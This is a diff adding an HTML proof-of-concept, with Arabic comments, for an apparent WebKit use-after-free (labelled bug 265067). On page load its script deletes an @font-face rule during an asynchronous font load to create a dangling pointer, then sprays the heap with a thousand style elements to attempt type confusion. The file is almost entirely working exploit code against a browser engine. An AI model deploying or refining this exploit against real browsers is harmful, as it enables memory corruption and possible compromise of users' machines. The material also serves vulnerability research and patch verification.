@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+/* 1. تعريف القواعد الأساسية للخطوط داخل الستايل */
+@font-face {
+    font-family: 'target-font';
+    src: local('Courier New');
+}
+</style>
+<script>
+function triggerPoC() {
+    // جلب مستند الستايل المتاح
+    let styleSheet = document.styleSheets[0];
+    
+    // 2. إنشاء كائن FontFace ديناميكي من الجافا سكريبت لربطه بالجدول
+    let fontFace = new FontFace('target-font', 'local("Arial")');
+    document.fonts.add(fontFace);
+    
+    // 3. استدعاء عملية تحميل الخط غير المتزامنة لفتح نافذة السباق
+    fontFace.load().then(function() {
+        console.log("Font loaded successfully (Safe Path)");
+    }).catch(function(err) {
+        console.log("Caught expected reference manipulation");
+    });
+
+    // 4. إحداث الـ Race Condition: تدمير القاعدة وحذفها فوراً أثناء المعالجة الداخيلة
+    // هذا يستدعي removeFromFacesLookupTable() بينما الكائن يمر بحالة تحرير
+    styleSheet.deleteRule(0); 
+    document.fonts.delete(fontFace);
+
+    // 5. إجبار المحرك على إعادة بناء جدول الـ Layout لتنشيط المؤشر المعلق (Dangling Pointer)
+    let div = document.createElement('div');
+    div.style.fontFamily = 'target-font';
+    div.innerText = 'Triggering Memory Corruption';
+    document.body.appendChild(div);
+    
+    // 6. الرش الفوري (Garbage Collection & Memory Spraying) لإعادة ملء الثغرة بكائن آخر
+    setTimeout(function() {
+        let spray = [];
+        for (let i = 0; i < 1000; i++) {
+            // رش كائنات من نفس الحجم في الـ IsoHeap (مثل كائنات CSSFontFace أخرى عبر الـ Rules)
+            let el = document.createElement('style');
+            el.textContent = `@font-face { font-family: 'spray-font-${i}'; src: local('Helvetica'); }`;
+            document.head.appendChild(el);
+            spray.push(el);
+        }
+        
+        // محاولة استدعاء الدالة المصابة بعد التداخل للتحقق من حدوث الـ Type Confusion
+        document.fonts.check('12px target-font');
+    }, 5);
+}
+
+window.onload = function() {
+    triggerPoC();
+};
+</script>
+</head>
+<body>
+    <h3>WebKit Bug 265067 - Use-After-Free Proof of Concept</h3>
+</body>
+</html>
